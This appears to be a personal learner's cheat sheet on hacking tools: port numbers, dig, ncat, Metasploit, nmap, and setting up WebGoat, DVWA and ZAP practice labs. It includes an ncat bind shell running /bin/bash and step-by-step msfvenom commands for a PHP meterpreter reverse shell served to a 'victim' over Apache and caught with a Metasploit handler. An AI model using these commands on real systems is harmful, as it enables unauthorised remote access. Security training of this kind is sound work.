# Hacking Tools
---
******************** Ports information **************************
There are 65535 port numbers (2^16).

20 and 21: FTP (File Transfer Protocol --> Transfer files between client and server)
22: SSH (Secure Shell --> Tunneling protocol for secure network connection)
23: Telnet
25: SMTP (Simple Mail Transfer Protocol --> Used for email)
53: DNS (Domain Name System --> Domain names to ip adresses)
67 and 68: DHCP (Dynamic Host Configuration Protocol --> Assigns IP adresses to devices dynamically)
80: HTTP (Hypertext Transfer Protocol --> Makes world wide web possible)
110: POP3 (Post Office Protocol --> For receiving emails)
123: NTP (Network Time Protocol --> Clock synchronization)
143: IMAP (Internet Message Access Protocol --> For receiving emails)
179: BGP (Boder Gateway Protocol --> Used for establish connections between large networks)
443: HTTPS (Hypertext Transfer Protocol Secure --> Secure and encrypted version of http)
500: ISAKMP (Internet Security Association and Key Management Protocol --> Is part of the process of setting up secure IPsec connections)
3306: Maria DB
3389: RDP (Remote Desktop Protocol --> Allows users to connect their computers from another device)

More information at:  (IANA --> Internet Assigned Numbers Authority) https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml
*************************************************************

## DIG

Tool for interrogating DNS name servers.

Get a DNS response (information about a domain):

```Shell
dig ns<number of server>.<domain>
```

Get simplified response (only ip address):

```Shell
dig +short ns.<domain>

// Get one of the google´s ip adresses
dig +short ns.google.com
```

Get belonging domain of an ip:

```Shell
dig +short -x <IP adress>
```


## NCAT

Tool for reading and writing data across the network.

Use ncat as a server running in port 8080:

```Shell
ncat -l <ip> <port>
```

Example:

```Shell
ncat -l 127.0.0.1 8080
```

Establish a connection with the server:

```Shell
ncat 127.0.0.1 8080
```

Running a command on the client side, will run the command on the host machine a print the output on the client:

```Shell
ncat -l --exec "/bin/bash" 127.0.0.1 8080
```

>[!Note]
>`ncat` = `nc`


## Metasploit

- Metasploit modules 
	- Exploits
	- Payloads
	- Auxiliary
	- Encoders
	- Nops
	- Posts
	- Evasion

Modules are located in: `/usr/share/metasploit-framework/modules`

>[!Note]
>- Try to run the database service to initialize the msf faster 'service postgresql start'
>- Dictionaries for brute-force attacks available at /usr/share/metasploit-framework/data/wordlists


``` Shell
msfdb // Manage metasploit framework database
msfconsole // Initiallize the metasploit framework
```

Once on the Metasploit framework:

```Metasploit
banner // Display a banner
db_status // Check the metasploit framework database status
use <module> // Use a certain metasploit module
show <options> // Show information about a moudule
set <option> <value> // Set options, use 'show options' to see them
search <field> <parameter> // Make queries about modules. e.g. type:payload
back // Return to metasploit framework main command line interface
run // Running an auxiliary
exploit // Running an exploit
```

>[!Note]
>_msfvenom_ is a payload generator

For instance, we can make a reverse shell  by using the payload: `php/meterpreter/reverse_tcp`

```Metasploit
msfvenom -p <payload> <option>=<value> <other optional flags> > <file name to contain the payload>
```

Setting the payload with our machine listening. '-e' flag for setting an appropiate encoder, '-f' flag for setting the file format as a raw file, also we are saving the payload into 'shell.php' file

```Metasploit
msfvenom -p php/meterpreter/reverse_tcp LHOST=<Our ip address> LPORT=4444 -e php/base64 -f raw > shell.php
```

LPORT is 4444 by default (try `msfvenom -p <payload> --list-options` to looking for options)

Inside the file we'll find a single line of base64 encoded payload, so we wrap that line like that:

```
<?php
<encoded payload>
?>
```

Then the machine will read it as php code.

Now we can start an _apache2 web server_ so the victim download the payload from there. 
Copy the file into `/var/www/html`, start the server and enter your ip adress into the browser.

Go to msfconsole and use `exploit/multi/handler` then set LHOST to your address and run the exploit for start listening. Once the victim machine opens the file a session will be created.

>[!Note]
>_ARMITAGE_ -> Graphical user interface for Metasploit


## NMAP

// Use -sS for a stealth scan, -sT flag is louder. Use -sV for showing services version

nmap <flags> <IP adress> (See open ports)




---------------------------------------------------------------------------------------------------

// WebGoat is a deliberately insecure web application maintained by OWASP designed to teach web application security lessons. 
docker run -it -p 127.0.0.1:80:8888 -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 -e TZ=Europe/Amsterdam webgoat/goatandwolf:v8.2.2 (Starting WebGoat)
// Web application located at: http://127.0.0.1:8080/WebGoat/login


// Now we are going to set up the DVWA web application
// We put DVWA file into /var/www/html
// Accesing MariaDB
mysql -u root -p
// mysql commands ends with semicolon
CREATE DATABASE dvwa; (Creating a database called dvwa)
GRANT all ON dvwa.* to dvwa@localhost identified by 'password'; (Granting permissions to the database)
flush privileges;
// Exit the MariaDB and rename the file into /var/www/html/DVWA/config
mv config.inc.php.dist config.inc.php
// Rewrite the file so set the user and the password to the ones setted in the database created
// Rewrite /etc/php/7.4/apache2/php.ini: allow_url_include = On
// Restart php service
// Enter localhost and create database
// Log in with admin123:password

---------------------------------ZED ATTACK PROXY---------------------------------------------

// Install zaproxy
// For quick scan use: http://www.webscanttest.com

---------------------------------------------------------------------------------------------------